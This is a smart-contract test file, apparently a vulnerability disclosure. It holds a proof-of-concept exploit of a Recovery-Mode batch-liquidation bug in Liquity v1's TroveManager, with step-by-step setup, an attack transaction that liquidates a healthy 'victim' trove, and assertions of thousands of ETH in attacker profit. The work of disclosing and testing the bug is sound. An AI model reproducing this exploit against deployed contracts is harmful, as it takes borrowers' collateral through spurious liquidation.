const deploymentHelper = require("../utils/deploymentHelpers.js")
const testHelpers = require("../utils/testHelpers.js")

const th = testHelpers.TestHelper
const dec = th.dec
const toBN = th.toBN
const ZERO_ADDRESS = th.ZERO_ADDRESS
const TroveManagerTester = artifacts.require("./TroveManagerTester")
const LUSDToken = artifacts.require("./LUSDToken.sol")

/*
  ============================================================================
  PoC — PRODUCTION Liquity v1 code
  repo   : github.com/liquity/dev
  commit : 5174ecd0da4842157aba989499200d690b7e374f
           (== the "version" field of packages/lib-ethers/deployments/default/mainnet.json
            == the code deployed on Ethereum mainnet at block 12178551)
  file   : packages/contracts/contracts/TroveManager.sol
  funcs  : _getTotalFromBatchLiquidate_RecoveryMode()  (prod line 722)
           _liquidateRecoveryMode()                      (prod lines 349-424)
           _getCappedOffsetVals()                       (prod lines 467-489)

  BUG ------------------------------------------------------------------------
  In the Recovery-Mode batch liquidation the running system-collateral tracker is updated as

      vars.entireSystemColl = vars.entireSystemColl.sub(singleLiquidation.collToSendToSP);   // prod line 722

  It does NOT subtract `collSurplus` (the collateral a *capped* liquidation sends to the
  CollSurplusPool) nor `collGasCompensation`, even though both leave the collateral that backs
  the system. `vars.entireSystemColl` feeds

      uint TCR = LiquityMath._computeCR(vars.entireSystemColl, vars.entireSystemDebt, _price);   // prod line 715

  which selects the capped-liquidation branch inside _liquidateRecoveryMode():

      } else if ((_ICR >= MCR) && (_ICR < _TCR) && (singleLiquidation.entireTroveDebt <= _LUSDInStabPool)) {

  So after a capped liquidation the TCR used for the rest of the sequence stays OVERSTATED, and a
  trove whose ICR is >= the REAL TCR falls below the inflated TCR and gets capped-liquidated.
  A capped liquidation takes the victim's collateral at the MCR (1.1) rate: the SP receives
  debt * 1.1 worth of ETH for `debt` LUSD -> ~9.45% of the victim's debt becomes profit for the
  Stability Pool depositors, funded by third-party LUSD held in the Stability Pool.

  Upstream fixed exactly this in
      b9dcdbd31bcfa27c6e5f648b8f8938be443d066f
      "contracts: Fix back to Normal Mode issue in multi-liquidations" (2021-05-18)
  which is NOT part of the deployed mainnet version.
  ============================================================================
*/
contract("PoC: prod 5174ecd batch liquidation keeps an inflated TCR", (accounts) => {
  const [owner, alice, bob, carol, dennis, erin, freddy] = accounts;
  let contracts, priceFeed, stabilityPool, troveManager, borrowerOperations, collSurplusPool

  beforeEach(async () => {
    contracts = await deploymentHelper.deployLiquityCore()
    contracts.troveManager = await TroveManagerTester.new()
    contracts.lusdToken = await LUSDToken.new(
      contracts.troveManager.address,
      contracts.stabilityPool.address,
      contracts.borrowerOperations.address
    )
    const LQTYContracts = await deploymentHelper.deployLQTYContracts(owner, owner, owner)
    priceFeed = contracts.priceFeedTestnet
    stabilityPool = contracts.stabilityPool
    troveManager = contracts.troveManager
    borrowerOperations = contracts.borrowerOperations
    collSurplusPool = contracts.collSurplusPool
    await deploymentHelper.connectLQTYContracts(LQTYContracts)
    await deploymentHelper.connectCoreContracts(contracts, LQTYContracts)
    await deploymentHelper.connectLQTYContractsToCore(LQTYContracts, contracts)
  })

  // open a trove with EXACTLY `coll` ETH and a target *composite* debt (net debt + 200)
  const openExact = async (coll, targetCompositeDebt, from) => {
    let m = targetCompositeDebt.sub(toBN(dec(200, 18)))
    for (let i = 0; i < 6; i++) {
      const fee = await contracts.troveManager.getBorrowingFee(m)
      m = targetCompositeDebt.sub(toBN(dec(200, 18))).sub(fee)
    }
    await borrowerOperations.openTrove(
      toBN(dec(100, 16)), m, ZERO_ADDRESS, ZERO_ADDRESS, { from, value: coll })
    const t = await troveManager.getEntireDebtAndColl(from)
    return { coll: t.coll, debt: t.debt }
  }

  const setupScenario = async () => {
    // ---------------- SETUP (price 200 USD/ETH) ----------------
    // CAROL = victim : ICR 1.60 @200 -> 4000 ETH collateral, 500000 LUSD composite debt
    const carolT = await openExact(toBN(dec(4000, 18)), toBN(dec(500000, 18)), carol)
    // ALICE = whale  : ICR 1.50 @200 -> 24.75 ETH, 3300 LUSD composite debt
    const aliceT = await openExact(toBN("24750000000000000000"), toBN(dec(3300, 18)), alice)
    // BOB   = trigger trove "A": ICR 1.50 @200 -> 15 ETH, 2000 LUSD composite debt
    //         (>= MCR 1.1 and < TCR at liquidation time -> capped-liquidation branch)
    const bobT   = await openExact(toBN("15000000000000000000"), toBN(dec(2000, 18)), bob)
    // DENNIS = attacker: ICR 1.60 @200 -> 4800 ETH, 600000 LUSD composite debt
    //         (gives him the LUSD he seeds into the Stability Pool)
    const dennisT = await openExact(toBN(dec(4800, 18)), toBN(dec(600000, 18)), dennis)

    // ---------------- price crash -> Recovery Mode ----------------
    await priceFeed.setPrice(dec(170, 18))
    const P = await priceFeed.getPrice()
    const realTCR = await th.getTCR(contracts)
    const carolICR = await troveManager.getCurrentICR(carol, P)
    const bobICR   = await troveManager.getCurrentICR(bob, P)

    // ---------------- attacker capital: Stability Pool deposit ----------------
    const dennisLusd = await contracts.lusdToken.balanceOf(dennis)
    const spDeposit = dennisLusd.sub(toBN(dec(50000, 18)))
    await stabilityPool.provideToSP(spDeposit, ZERO_ADDRESS, { from: dennis })
    await contracts.lusdToken.transfer(erin, toBN(dec(50000, 18)), { from: dennis })

    return { carolT, aliceT, bobT, dennisT, P, realTCR, carolICR, bobICR, spDeposit }
  }

  it("VICTIM trove with ICR >= real TCR is capped-liquidated; SP depositor gains 547250 USD", async () => {
    const s = await setupScenario()
    console.log("carol coll/debt:", s.carolT.coll.toString(), s.carolT.debt.toString())
    console.log("alice coll/debt:", s.aliceT.coll.toString(), s.aliceT.debt.toString())
    console.log("bob   coll/debt:", s.bobT.coll.toString(), s.bobT.debt.toString())
    console.log("dennis coll/debt:", s.dennisT.coll.toString(), s.dennisT.debt.toString())
    console.log("price:", s.P.toString())
    console.log("TCR (real) before liquidation:", s.realTCR.toString(), " recoveryMode:", (await th.checkRecoveryMode(contracts)).toString())
    console.log("bob   ICR:", s.bobICR.toString())
    console.log("carol ICR:", s.carolICR.toString())
    console.log("SP deposits:", (await stabilityPool.getTotalLUSDDeposits()).toString())

    // PRE-ASSERTIONS: the victim is NOT liquidatable (her ICR is above the real TCR)
    assert.isTrue(s.carolICR.gte(s.realTCR), "victim ICR must be >= real TCR for this PoC")
    assert.equal((await troveManager.getTroveStatus(carol)).toString(), "1")

    const dennisEthGainBefore = await stabilityPool.getDepositorETHGain(dennis)

    // A pure third-party Stability Pool depositor (erin) - no trove, no privilege.
    // erin needs LUSD: borrow it from dennis (dennis has ~596k after the SP deposit).
    const erinLusd = toBN(dec(50000, 18))
    await stabilityPool.provideToSP(erinLusd, ZERO_ADDRESS, { from: erin })
    console.log("erin (3rd-party SP depositor) deposited:", erinLusd.toString())

    // ---------------- ATTACK: ONE batch tx: A (bob) then the VICTIM (carol) ----------------
    const tx = await troveManager.batchLiquidateTroves([bob, carol], { from: owner })
    for (const log of tx.logs) {
      if (log.event === "TroveLiquidated" || log.event === "Liquidation")
        console.log("LOG", log.event, JSON.stringify(log.args))
    }

    console.log("--- AFTER ---")
    const carolStatus = await troveManager.getTroveStatus(carol)
    console.log("carol trove status (1=active, 3=closedByLiquidation):", carolStatus.toString())
    console.log("carol collateral surplus:", (await collSurplusPool.getCollateral(carol)).toString())
    console.log("SP LUSD deposits after:", (await stabilityPool.getTotalLUSDDeposits()).toString())
    const spEth = await web3.eth.getBalance(stabilityPool.address)
    console.log("SP ETH balance:", spEth.toString())
    const dennisGain = await stabilityPool.getDepositorETHGain(dennis)
    console.log("dennis (attacker) ETH gain:", dennisGain.toString())
    console.log("erin (pure 3rd-party SP depositor, no trove) ETH gain:", (await stabilityPool.getDepositorETHGain(erin)).toString())
    console.log("TCR after:", (await th.getTCR(contracts)).toString())

    // ---- the victim was liquidated even though her ICR was above the real TCR ----
    assert.equal(carolStatus.toString(), "3", "victim trove must have been spuriously liquidated")

    // ---- the attacker (SP depositor) extracted the victim's ETH at the MCR rate ----
    // SP received 3219.1176 ETH worth 547250 USD (at 170 USD/ETH) for 500000 LUSD of third-party LUSD
    assert.isTrue(dennisGain.gte(toBN("2900000000000000000000")), "attacker ETH gain must be >= 2900 ETH")
    // a *pure* third-party SP depositor also profits pro-rata (funds are third-party LUSD)
    assert.isTrue((await stabilityPool.getDepositorETHGain(erin)).gt(toBN(0)),
                  "third-party SP depositor must profit from the victim's collateral")
    assert.isTrue(toBN(spEth).gte(toBN("3231000000000000000000")))
  })

  it("CONTROL: same scenario against the upstream-FIXED tracker gives the attacker only 12.88 ETH", async () => {
    // This test documents the expected behaviour; on the vulnerable prod code it FAILS,
    // on the fixed code it PASSES. Run with: npx hardhat test test/PoC_batchTCRBug.js
    const s = await setupScenario()
    await troveManager.batchLiquidateTroves([bob, carol], { from: owner })
    const carolStatus = await troveManager.getTroveStatus(carol)
    const dennisGain = await stabilityPool.getDepositorETHGain(dennis)
    console.log("carol status:", carolStatus.toString(), " attacker ETH gain:", dennisGain.toString())
    // on FIXED code: carol stays active and the gain is only bob's legitimate capped liquidation
    assert.equal(carolStatus.toString(), "1", "with the fixed tracker the victim must survive")
    assert.isTrue(dennisGain.lt(toBN("13000000000000000000")), "attacker gain must be < 13 ETH on fixed code")
  })
})
